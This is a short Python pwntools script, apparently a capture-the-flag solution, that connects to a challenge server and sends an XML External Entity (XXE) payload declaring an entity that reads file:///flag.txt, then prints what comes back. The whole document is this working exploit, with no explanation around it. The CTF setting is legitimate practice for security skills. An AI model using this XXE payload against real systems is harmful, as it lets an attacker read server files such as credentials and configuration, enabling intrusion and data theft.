from pwn import *

con = remote('extract.tghack.no', 6000)
print(con.recv().decode())
con.sendline('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///flag.txt">]><root>&test;</root>')
print(con.recv().decode())